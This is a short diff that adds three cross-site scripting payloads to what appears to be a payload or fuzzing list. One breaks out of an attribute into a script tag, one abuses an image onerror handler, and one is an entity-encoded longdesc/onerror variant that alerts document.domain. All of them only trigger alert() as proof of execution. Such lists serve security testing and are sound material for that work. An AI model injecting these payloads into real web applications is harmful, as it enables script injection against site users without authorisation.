@@ -1,0 +1,4 @@
+"><script>alert(1)</script>
+<Img/Src/OnError=(alert)(1)>
+&lt;img longdesc="src='x'onerror=alert(document.domain);//&gt;&lt;img " src='showme'&gt;
+
